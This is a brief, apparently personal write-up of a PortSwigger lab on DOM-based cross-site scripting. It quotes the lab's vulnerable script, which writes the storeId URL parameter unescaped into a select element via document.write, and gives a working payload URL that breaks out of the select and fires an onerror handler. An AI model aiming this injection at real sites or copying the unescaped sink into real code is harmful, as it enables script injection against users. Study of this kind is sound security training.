link lab:https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element


Flaw in the script code It will take the stock value and create options with select that we will take advantage of to insert xss malicious code.


product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>


<script>
                                var stores = ["London","Paris","Milan"];
                                var store = (new URLSearchParams(window.location.search)).get('storeId');
                                document.write('<select name="storeId">');
                                if(store) {
                                    document.write('<option selected>'+store+'</option>');
                                }
                                for(var i=0;i<stores.length;i++) {
                                    if(stores[i] === store) {
                                        continue;
                                    }
                                    document.write('<option>'+stores[i]+'</option>');
                                }
                                document.write('</select>');
                            </script>

